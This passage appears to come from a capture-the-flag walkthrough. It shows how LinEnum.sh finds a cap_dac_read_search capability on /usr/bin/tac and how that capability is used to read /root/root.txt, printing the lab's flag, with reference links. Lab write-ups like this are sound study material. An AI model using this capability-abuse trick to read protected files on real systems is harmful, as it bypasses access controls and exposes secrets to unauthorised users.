Eventually with the help of the latest version of the `LinEnum.sh` script, we
discover this file..

```
bash-4.4$ /sbin/getcap /usr/bin/tac
/usr/bin/tac = cap_dac_read_search+ei
```

```
bash-4.4$ man tac
TAC(1)                           User Commands                           TAC(1)

NAME
       tac - concatenate and print files in reverse

SYNOPSIS
       tac [OPTION]... [FILE]...

DESCRIPTION
       Write each FILE to standard output, last line first.

```

Don't know if there is a way to actually get a `root` shell, but we're able to
read any file we want on the system now..

```
bash-4.4$ tac /root/root.txt
8fb67c84418be6e45fbd348fd4584f6
```

### REFERENCES

```
https://tipstrickshack.blogspot.com/2013/02/how-to-bypassing-filter-to-traversal_8831.html
https://netsec.ws/?p=309
https://packetstorm.foofus.com/papers/attack/exploiting_capabilities_the_dark_side.pdf
```
